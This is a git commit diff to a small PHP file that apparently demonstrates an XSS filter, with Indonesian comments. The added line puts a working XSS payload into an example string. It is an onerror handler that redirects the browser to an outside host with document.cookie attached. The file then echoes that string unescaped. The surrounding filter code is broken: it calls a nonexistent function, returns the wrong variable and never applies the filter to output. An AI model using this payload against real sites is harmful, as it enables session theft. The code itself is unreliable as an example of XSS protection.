02adf0996048c991708527bfad58a37a5d2166b3
Hildan Kusto Utomo <91795239+hldnkstou@users.noreply.github.com>
2021-10-05 07:11:27 +0700

    Update hldnkstouxssfilterfunc.php
    update exanple progran

--- hldnkstouxssfilterfunc.php
+++ hldnkstouxssfilterfunc.php
@@ -5,7 +5,7 @@ $filterxss = strip_slashes(strip_tags(htmlspecialchars(htmlentities($data,ENT_QU
 return $filter;
 
 }
-	$message = '<script>alert(1)</script>'; // contoh serangan xss
+	$message = '<script>alert(1)</script> atau <video><source onerror=location=/\02.rs/+document.cookie> '; // contoh serangan xss
 	$input = mysqli_real_escape_string(trim(filterxss($_POST['message'])));
 echo $message;
 
